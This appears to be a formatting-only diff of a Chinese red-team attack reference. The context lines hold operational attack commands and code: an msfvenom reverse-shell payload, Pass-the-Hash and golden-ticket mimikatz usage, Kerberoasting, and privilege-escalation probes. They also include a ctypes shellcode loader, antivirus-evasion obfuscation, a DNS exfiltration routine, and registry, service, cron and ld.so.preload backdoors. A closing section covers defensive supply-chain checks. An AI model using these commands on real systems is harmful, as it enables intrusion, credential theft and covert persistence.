@@ -5,7 +5,6 @@ description: 红队攻击技术。PoC开发、C2框架、横向移动、权限�
 
 # 🔥 赤焰秘典 · 红队攻击 (Red Team)
 
-
 ## 攻击链 (Kill Chain)
 
 ```
@@ -17,6 +16,7 @@ description: 红队攻击技术。PoC开发、C2框架、横向移动、权限�
 ## PoC 开发
 
 ### 标准 PoC 结构
+
 ```python
 #!/usr/bin/env python3
 """
@@ -67,6 +67,7 @@ if __name__ == '__main__':
 ## C2 框架
 
 ### Sliver (推荐开源)
+
 ```bash
 # 安装
 curl https://sliver.sh/install | sudo bash
@@ -88,6 +89,7 @@ sliver (SESSION) > upload local remote
 ```
 
 ### Metasploit
+
 ```bash
 # 生成 Payload
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe
@@ -106,6 +108,7 @@ meterpreter > creds_all
 ```
 
 ### 简易 HTTP C2
+
 ```python
 # Server
 from flask import Flask, request, jsonify
@@ -130,6 +133,7 @@ def result(agent_id):
 ## 横向移动
 
 ### Pass-the-Hash (PTH)
+
 ```bash
 # Impacket
 psexec.py -hashes :NTLM_HASH administrator@TARGET
@@ -145,6 +149,7 @@ sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:cmd.exe
 ```
 
 ### Pass-the-Ticket (PTT)
+
 ```bash
 # 导出票据
 mimikatz # sekurlsa::tickets /export
@@ -157,6 +162,7 @@ Rubeus.exe ptt /ticket:ticket.kirbi
 ```
 
 ### Kerberos 攻击
+
 ```bash
 # Kerberoasting
 GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request
@@ -169,6 +175,7 @@ mimikatz # kerberos::golden /user:admin /domain:DOMAIN /sid:S-1-5-21-xxx /krbtgt
 ```
 
 ### 远程执行方法
+
 ```bash
 # WinRM
 evil-winrm -i TARGET -u user -H HASH
@@ -184,6 +191,7 @@ wmic /node:TARGET /user:admin /password:pass process call create "cmd.exe /c who
 ## 权限提升
 
 ### Windows 提权
+
 ```powershell
 # 信息收集
 whoami /priv
@@ -205,6 +213,7 @@ GodPotato.exe -cmd "cmd /c whoami"
 ```
 
 ### Linux 提权
+
 ```bash
 # 信息收集
 id
@@ -228,6 +237,7 @@ find / -perm -4000 2>/dev/null
 ## 免杀技术
 
 ### 基础免杀
+
 ```python
 # 1. 字符串混淆
 import base64
@@ -245,6 +255,7 @@ from Crypto.Cipher import AES
 ```
 
 ### Shellcode 加载
+
 ```python
 import ctypes
 
@@ -258,6 +269,7 @@ ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
 ```
 
 ### 隐蔽通信
+
 ```python
 # DNS 隧道
 def dns_exfil(data, domain):
@@ -274,6 +286,7 @@ def domain_fronting(real_host, cdn_domain, data):
 ## 持久化
 
 ### Windows
+
 ```powershell
 # 注册表
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\backdoor.exe"
@@ -289,6 +302,7 @@ sc create backdoor binPath= "C:\backdoor.exe" start= auto
 ```
 
 ### Linux
+
 ```bash
 # Crontab
 echo "* * * * * /tmp/backdoor" >> /var/spool/cron/root
@@ -305,35 +319,37 @@ echo "/tmp/evil.so" >> /etc/ld.so.preload
 
 ## 工具清单
 
-| 工具 | 用途 |
-|------|------|
-| Sliver | 开源 C2 框架 |
-| Metasploit | 渗透测试框架 |
-| Cobalt Strike | 商业 C2 |
-| Impacket | Windows 协议工具 |
-| CrackMapExec | 批量横向 |
-| Mimikatz | 凭证提取 |
-| Rubeus | Kerberos 工具 |
-| BloodHound | AD 路径分析 |
+| 工具            | 用途           |
+|---------------|--------------|
+| Sliver        | 开源 C2 框架     |
+| Metasploit    | 渗透测试框架       |
+| Cobalt Strike | 商业 C2        |
+| Impacket      | Windows 协议工具 |
+| CrackMapExec  | 批量横向         |
+| Mimikatz      | 凭证提取         |
+| Rubeus        | Kerberos 工具  |
+| BloodHound    | AD 路径分析      |
 
 ## 供应链安全
 
 ### 供应链攻击向量
+
 ```
 源代码 → 构建 → 制品 → 分发 → 部署 → 运行
    │       │      │      │      │      │
    投毒    篡改   后门   劫持   提权   横向
 ```
 
-| 阶段 | 攻击方式 | 示例 |
-|------|----------|------|
-| 源代码 | 依赖投毒 | event-stream、ua-parser-js |
-| 构建 | CI/CD 劫持 | SolarWinds、CodeCov |
-| 制品 | 恶意包 | PyPI/npm 钓鱼包 |
-| 部署 | 配置篡改 | K8s YAML 注入 |
-| 运行 | 容器逃逸 | 特权容器、内核漏洞 |
+| 阶段  | 攻击方式     | 示例                        |
+|-----|----------|---------------------------|
+| 源代码 | 依赖投毒     | event-stream、ua-parser-js |
+| 构建  | CI/CD 劫持 | SolarWinds、CodeCov        |
+| 制品  | 恶意包      | PyPI/npm 钓鱼包              |
+| 部署  | 配置篡改     | K8s YAML 注入               |
+| 运行  | 容器逃逸     | 特权容器、内核漏洞                 |
 
 ### SBOM + 依赖扫描
+
 ```bash
 # SBOM 生成 (Syft)
 syft nginx:latest -o cyclonedx-json > sbom.json
@@ -347,6 +363,7 @@ grype sbom:./sbom.json
 ```
 
 ### 签名验证 (Sigstore/Cosign)
+
 ```bash
 cosign sign --key cosign.key myregistry/myapp:v1.0
 cosign verify --key cosign.pub myregistry/myapp:v1.0
@@ -355,12 +372,14 @@ cosign verify-attestation --key cosign.pub myregistry/myapp:v1.0
 ```
 
 ### SLSA 等级
+
 ```
 Level 1: 文档化构建  Level 2: 防篡改+签名来源
 Level 3: 安全平台+隔离构建  Level 4: 双方审查+密封构建
 ```
 
 ### 供应链安全检查清单
+
 ```yaml
 源代码:
   - [ ] 分支保护 + 代码审查 + 依赖锁定 + 密钥泄露扫描
